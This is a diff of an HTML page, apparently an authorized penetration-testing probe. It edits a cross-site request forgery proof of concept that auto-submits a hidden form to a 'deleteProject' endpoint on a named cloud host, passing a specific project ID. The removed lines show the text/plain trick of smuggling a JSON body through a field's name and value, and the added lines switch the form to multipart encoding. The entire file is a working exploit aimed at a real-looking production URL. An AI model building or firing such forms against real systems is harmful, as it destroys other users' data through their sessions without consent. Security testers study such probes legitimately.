@@ -1,20 +1,20 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>Authorized text/plain CSRF probe</title>
-<h1>Authorized text/plain CSRF probe</h1>
+<title>Authorized multipart CSRF probe</title>
+<h1>Authorized multipart CSRF probe</h1>
 <p id="status">Preparing the disposable-record test...</p>
 
 <form
   id="csrf-form"
   method="POST"
   target="_top"
-  enctype="text/plain"
+  enctype="multipart/form-data"
   action="https://totalspendmanagement-smart-data-hub-smart-data-hub-ui-approuter.cfapps.eu10.hana.ondemand.com/cap_api/odata/v4/srv/deleteProject"
 >
   <input
     type="hidden"
-    name='{"PROJECT_ID":"'
-    value='","PROJECT_ID":"660655de-d7ba-4ee1-a75d-c71d00b073e9"}'
+    name="PROJECT_ID"
+    value="660655de-d7ba-4ee1-a75d-c71d00b073e9"
   >
 </form>
 
